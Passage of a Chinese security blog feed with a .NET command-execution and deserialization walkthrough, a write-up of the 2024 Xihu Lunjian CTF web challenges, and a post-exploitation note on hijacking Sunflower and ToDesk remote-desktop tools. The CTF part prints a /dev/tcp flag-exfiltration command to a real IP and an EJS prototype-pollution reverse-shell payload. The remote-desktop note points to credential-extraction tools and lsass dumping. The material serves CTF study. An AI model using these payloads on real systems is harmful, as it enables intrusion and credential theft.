class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApplication1;</span><br><span class="line"></span><br><span class="line">public class Command</span><br><span class="line">&#123;</span><br><span class="line">    public static void Main(string[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        var process = new Process();</span><br><span class="line">        process.StartInfo.FileName = &quot;cmd.exe&quot;;</span><br><span class="line">        process.StartInfo.Arguments = &quot;/c whoami&quot;;</span><br><span class="line">        process.StartInfo.RedirectStandardOutput = true;</span><br><span class="line">        process.StartInfo.UseShellExecute = false;</span><br><span class="line">        process.Start();</span><br><span class="line">        var processStandardOutput = process.StandardOutput.ReadToEnd();</span><br><span class="line">        Console.WriteLine(processStandardOutput);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240222170918255.png" alt="image-20240222170918255"></p><p>这样的话cmd窗口就不会弹出  回显也有了</p><p>其中RedirectStandardOutput和UseShellExecute需要注意一下</p><blockquote><ul><li>RedirectStandardOutput：<ul><li>当设置为 true 时，表示重定向标准输出流，即将进程的标准输出流（通常是在控制台窗口中显示的信息）连接到 Process.StandardOutput 流中，以便你的程序可以读取进程的输出。</li></ul></li><li>UseShellExecute：<ul><li>当设置为 false 时，表示不使用操作系统的 shell 启动进程。相反，它允许你直接启动可执行文件，命令行等，而不需要借助 shell。(不弹出cmd窗口的关键)</li></ul></li></ul></blockquote><h2 id="命令执行-02"><a href="#命令执行-02" class="headerlink" title="命令执行-02"></a>命令执行-02</h2><p>ObjectDataProvider  这个类也是可以进行命令执行的   其实最终也是调用到这个Process类才能执行</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">WpfApplication2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Command</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> objectDataProvider = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">        objectDataProvider.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">        objectDataProvider.MethodParameters.Add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">        objectDataProvider.MethodParameters.Add(<span class="string">&quot;/c calc&quot;</span>);</span><br><span class="line">        objectDataProvider.ObjectInstance = <span class="keyword">new</span> Process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建项目的时候要选择wpf</p><p>接下来分析一下是怎么样能命令执行的</p><p><img src="../images/image-20240223100109274.png" alt="image-20240223100109274"></p><p>跟进ObjectDataProvider类ObjectInstance方法中</p><p><img src="../images/image-20240223100208142.png" alt="image-20240223100208142"></p><p>跟进Refresh方法中</p><p><img src="../images/image-20240223100248546.png" alt="image-20240223100248546"></p><p>跟进到这个QueryWorker方法中</p><p><img src="../images/image-20240223100321621.png" alt="image-20240223100321621"></p><p>在这个方法中  就会一直循环来给我们刚开始传入的值进行赋值</p><p><img src="../images/image-20240223100529141.png" alt="image-20240223100529141"></p><p>然后跟进这个方法中  </p><p><img src="../images/image-20240223100557318.png" alt="image-20240223100557318"></p><p>这里就获取到了Process类了</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2024/02/02/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20Deserialization%2001/#04-%E5%BA%8F%E5%88%97</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑2024-Web部分</title>
    <link href="https://ke1nys.github.io/posts/2e351f8.html"/>
    <id>https://ke1nys.github.io/posts/2e351f8.html</id>
    <published>2024-02-01T08:05:33.000Z</published>
    <updated>2024-02-24T13:59:43.491Z</updated>
    
    <content type="html"><![CDATA[<p>环境都关了  自己搭个简陋的来测试</p><p>参考</p><p><a href="https://mp.weixin.qq.com/s/KiP3jU1WghdBXLMDpb3FJQ">https://mp.weixin.qq.com/s/KiP3jU1WghdBXLMDpb3FJQ</a></p><h2 id="Ezinject"><a href="#Ezinject" class="headerlink" title="Ezinject"></a>Ezinject</h2><p>./git泄露  githack下载源码下来</p><p><img src="../images/image-20240201160921186.png" alt="image-20240201160921186"></p><p>这就是个逻辑问题  tmd  当时困住了一会  session我们是无法进行修改的  那么我们就从其逻辑下手  先让ua为空报错  进入到catch中  使其loginOk不为null 为false  那么再次进入try的时候  我们就能直接进入到else中  使loginOk为True从而可以执行命令</p><p><img src="../images/image-20240201161142460.png" alt="image-20240201161142460"></p><p>这个command我们可控  重点就是讲这里了   他使用的expect命令来执行call.sh</p><p><img src="../images/image-20240201161234247.png" alt="image-20240201161234247"></p><p>使用的使tclsh来进行解析  和别的bash还是有点不同的 </p><p><img src="../images/image-20240201161326949.png" alt="image-20240201161326949"></p><p>password固定了 那么我们现在就剩这个 port和host还有dir可控了  因为在expect中执行命令需要system开头 那么port就被占用了  我们就剩host和dir了  我们本地进行演示一下 靠     <code>xx test -d xx</code>    能不能执行命令</p><p><img src="../images/image-20240201161801422.png" alt="image-20240201161801422"></p><p>这样是可以正常执行的  后面的参数对echo来说都是字符串</p><p><img src="../images/image-20240201162149384.png" alt="image-20240201162149384"></p><p>使用  `` 来当shell执行  这样是可以的 那么我们就构造好了</p><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">command=echo  [system &#x27;`cat&lt;/flag&gt;/dev/tcp/101.42.39.110/3389`&#x27;|bash]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat&lt;/flag和cat /flag的效果是一样的   这里我们将获取到的结果 &gt; 到vps上</span><br></pre></td></tr></table></figure><p>拼接到命令行中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval spawn ssh -p [system echo test -d &#x27;`cat&lt;/flag&gt;/dev/tcp/101.42.39.110/3389`&#x27;|bash]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240201162617758.png" alt="image-20240201162617758"></p><p><img src="../images/image-20240201162629032.png" alt="image-20240201162629032"></p><p>还有一种解法是使用tclsh的exec方法来执行</p><p><a href="https://boogipop.com/2024/01/31/%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Writeup/">https://boogipop.com/2024/01/31/%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Writeup/</a></p><h2 id="ezerp"><a href="#ezerp" class="headerlink" title="ezerp"></a>ezerp</h2><p><a href="https://mp.weixin.qq.com/s/KiP3jU1WghdBXLMDpb3FJQ">https://mp.weixin.qq.com/s/KiP3jU1WghdBXLMDpb3FJQ</a></p><p>看这篇文章来进行学习吧  主要是学习人家的思路  动调源码来分析  然后找到官方提供的制造插件的方法  然后伪造一个插件  然后在利用issue上的一个任意文件上传洞  上传恶意构造好的jar包  然后install就能RCE了</p><p>主要是学习人家的耐心和动调的思路</p><p><strong>(要是让我动调来做的话  估计没有耐心。。。。。。。。。。)</strong></p><p>文件上传的题少用bp  因为 <code>paste for file</code>会损坏文件内容</p><h2 id="Easyjs"><a href="#Easyjs" class="headerlink" title="Easyjs"></a>Easyjs</h2><p>这个题的话  CTF复现计划群里有docker  直接搭建就行</p><p><strong>(早知道当时来看这个题了  当时绑死在那个inject题那了  还没做出……………………….)</strong></p><p>用dirsearch扫或者直接看  <code>robots.txt</code>  都是能直接看到路由的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rename</span><br><span class="line">upload</span><br><span class="line">list</span><br><span class="line">file</span><br></pre></td></tr></table></figure><p>一共是有这四个路由  </p><p><img src="../images/image-20240201183754102.png" alt="image-20240201183754102"></p><p>随便上传文件后  会返回uuid  等会我们就可以根据这个uuid来获取到我们上传的文件</p><p><img src="../images/image-20240201183932743.png" alt="image-20240201183932743"></p><p>漏洞点就在重命名处   存在路径穿越漏洞</p><p><img src="../images/image-20240201184354447.png" alt="image-20240201184354447"></p><p>重命名后</p><p><img src="../images/image-20240201184408115.png" alt="image-20240201184408115"></p><p>然后使用file来进行读取</p><p><img src="../images/image-20240201184420792.png" alt="image-20240201184420792"></p><p>这个就是sh文件的内容  <code>node /app/index.js</code>  然后再用相同的方法读取该文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> _= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> putil_merge = <span class="built_in">require</span>(<span class="string">&quot;putil-merge&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuidv4 &#125; = <span class="built_in">require</span>(<span class="string">&#x27;uuid&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;value&#125; = <span class="built_in">require</span>(<span class="string">&quot;lodash/seq&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">// 将文件信息存储到全局字典中</span></span><br><span class="line"><span class="variable language_">global</span>.<span class="property">fileDictionary</span> = <span class="variable language_">global</span>.<span class="property">fileDictionary</span> || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileUpload</span>());</span><br><span class="line"><span class="comment">// 使用 body-parser 处理 POST 请求的数据</span></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"><span class="comment">// 设置模板的位置</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line"><span class="comment">// 设置模板引擎</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="comment">// 静态文件（CSS）目录</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/index&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//显示上传页面</span></span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> file = req.<span class="property">files</span>.<span class="property">file</span>;</span><br><span class="line">    <span class="keyword">const</span> uniqueFileName = <span class="title function_">uuidv4</span>();</span><br><span class="line">    <span class="keyword">const</span> destinationPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, file.<span class="property">name</span>);</span><br><span class="line">    <span class="comment">// 将文件写入 uploads 目录</span></span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(destinationPath, file.<span class="property">data</span>);</span><br><span class="line">    <span class="variable language_">global</span>.<span class="property">fileDictionary</span>[uniqueFileName] = file.<span class="property">name</span>;</span><br><span class="line">    res.<span class="title function_">send</span>(uniqueFileName);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/list&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// const keys = Object.keys(global.fileDictionary);</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="variable language_">global</span>.<span class="property">fileDictionary</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/file&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">query</span>.<span class="property">uniqueFileName</span>)&#123;</span><br><span class="line">        uniqueFileName = req.<span class="property">query</span>.<span class="property">uniqueFileName</span></span><br><span class="line">        filName = <span class="variable language_">global</span>.<span class="property">fileDictionary</span>[uniqueFileName]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filName)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(__dirname+<span class="string">&quot;/uploads/&quot;</span>+filName).<span class="title function_">toString</span>())</span><br><span class="line">            &#125;<span class="keyword">catch</span> (error)&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&quot;文件不存在！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;文件不存在！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/rename&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&quot;rename&quot;</span>)</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">oldFileName</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">newFileName</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">uuid</span>)&#123;</span><br><span class="line">        oldFileName = req.<span class="property">body</span>.<span class="property">oldFileName</span></span><br><span class="line">        newFileName = req.<span class="property">body</span>.<span class="property">newFileName</span></span><br><span class="line">        uuid = req.<span class="property">body</span>.<span class="property">uuid</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">waf</span>(oldFileName)  &amp;&amp; <span class="title function_">waf</span>(newFileName) &amp;&amp;  <span class="title function_">waf</span>(uuid))&#123;</span><br><span class="line">            uniqueFileName = <span class="title function_">findKeyByValue</span>(<span class="variable language_">global</span>.<span class="property">fileDictionary</span>,oldFileName)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> uuid);</span><br><span class="line">            <span class="keyword">if</span> (uniqueFileName == uuid)&#123;</span><br><span class="line">                <span class="title function_">putil_merge</span>(<span class="variable language_">global</span>.<span class="property">fileDictionary</span>,&#123;[uuid]:newFileName&#125;,&#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;)</span><br><span class="line">                <span class="keyword">if</span>(newFileName.<span class="title function_">includes</span>(<span class="string">&#x27;..&#x27;</span>))&#123;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名失败！！！&#x27;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    fs.<span class="title function_">rename</span>(__dirname+<span class="string">&quot;/uploads/&quot;</span>+oldFileName, __dirname+<span class="string">&quot;/uploads/&quot;</span>+newFileName, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                            res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名失败！&#x27;</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名成功！&#x27;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名失败！&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;哒咩哒咩！&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名失败！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findKeyByValue</span>(<span class="params">obj, targetValue</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj.<span class="title function_">hasOwnProperty</span>(key) &amp;&amp; obj[key] === targetValue) &#123;</span><br><span class="line">            <span class="keyword">return</span> key;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 如果未找到匹配的键名，返回null或其他标识</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">data</span>) &#123;</span><br><span class="line">            data = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span><br><span class="line">            <span class="keyword">if</span> (data.<span class="title function_">includes</span>(<span class="string">&#x27;outputFunctionName&#x27;</span>) || data.<span class="title function_">includes</span>(<span class="string">&#x27;escape&#x27;</span>) || data.<span class="title function_">includes</span>(<span class="string">&#x27;delimiter&#x27;</span>) || data.<span class="title function_">includes</span>(<span class="string">&#x27;localsName&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设置http</span></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8888</span>,<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;http://127.0.0.1:%s&quot;</span>, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240201184543074.png" alt="image-20240201184543074"></p><p><img src="../images/image-20240201184552402.png" alt="image-20240201184552402"></p><p>findKeyByValue这个函数存在原型链污染  然后题目还说是ejs  于是猜测是打ejs的原型链污染</p><p><a href="https://github.com/mde/ejs/issues/730">https://github.com/mde/ejs/issues/730</a></p><p>在ejs的issue里看到有5个paylaod   题目过滤了三个  那么我们直接挑<code>destructuredLocals</code>这个来打就行了</p><p><img src="../images/image-20240201184755545.png" alt="image-20240201184755545"></p><p>最终paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;oldFileName&quot;:&quot;a.txt&quot;,&quot;newFileName&quot;:&#123;&quot;__proto__&quot;:&#123; &quot;destructuredLocals&quot;:[&quot;__line=__line;global.process.mainModule.require(&#x27;child_proce ss&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;);//&quot;] &#125;&#125;,&quot;uuid&quot;:&quot;5769140e-b76b-419a-b590-9630f023bdd7&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240201185936210.png" alt="image-20240201185936210"></p><p>然后这样就能RCE了  这个环境可能有点问题  没弹上反正</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境都关了  自己搭个简陋的来测试&lt;/p&gt;
&lt;p&gt;参考&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/KiP3jU1WghdBXLMDpb3FJQ&quot;&gt;https://mp.weixin.qq.com/s/KiP3jU1WghdBXLM</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ke1nys.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Windows-权限维持</title>
    <link href="https://ke1nys.github.io/posts/97ea5cd4.html"/>
    <id>https://ke1nys.github.io/posts/97ea5cd4.html</id>
    <published>2024-01-31T03:18:34.000Z</published>
    <updated>2024-02-24T13:59:43.424Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0446676abece824c755902fbd7d0260ba9517d33a3a9b199fa165c9ad6796c37"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>后渗透-远控RDP</title>
    <link href="https://ke1nys.github.io/posts/aae7bc59.html"/>
    <id>https://ke1nys.github.io/posts/aae7bc59.html</id>
    <published>2024-01-25T07:50:00.000Z</published>
    <updated>2024-02-24T13:59:43.426Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里主要就是介绍向日葵和toDesk   </p><p><a href="https://github.com/wafinfo/Sunflower_get_Password">https://github.com/wafinfo/Sunflower_get_Password</a>    向日葵解密验证码工具</p><p><a href="https://github.com/RuoJi6/Deskbypass/tree/main">https://github.com/RuoJi6/Deskbypass/tree/main</a>    远控软件</p><p>查找进程命令  <code>tasklist | findstr ToDesk</code> </p><p>kill掉进程命令  <code>taskkill /f /pid 9908</code></p><p><strong>(这里用toDesk举例)</strong></p><h2 id="向日葵"><a href="#向日葵" class="headerlink" title="向日葵"></a>向日葵</h2><p>这里分为绿色版(SOS版)和安装版  如果目标机器上没有的话  可以尝试上传绿色版<strong>(可以免安装)</strong></p><p><img src="../images/image-20240125161118076.png" alt="image-20240125161118076"></p><p><img src="../images/image-20240125161011714.png" alt="image-20240125161011714"></p><p>对于高版本来说  配置文件里已经不包含识别码和验证码了   但是可以在注册表中查看</p><p>对于12.5.3以上的版本的话 全部都不通用了</p><p>但是对于高版本来说  有一招就是读内存的方法 就是读lsass文件  里面存着windows下的所有账号密码</p><p><img src="../images/image-20240125161836773.png" alt="image-20240125161836773"></p><p><img src="../images/image-20240125161856249.png" alt="image-20240125161856249"></p><p>这也是得需要system权限的</p><h3 id="向日葵绿色版"><a href="#向日葵绿色版" class="headerlink" title="向日葵绿色版"></a>向日葵绿色版</h3><p>可以免安装直接使用</p><p>但是这里的话得用管理员权限才行<strong>(SYSTEM)</strong>    不然会弹UAC</p><p><img src="../images/image-20240125155733304.png" alt="image-20240125155733304"></p><p>如果用管理员权限打开的话就不会出现这个问题</p><p><img src="../images/image-20240125155842299.png" alt="image-20240125155842299"></p><p>直接就可以运行了   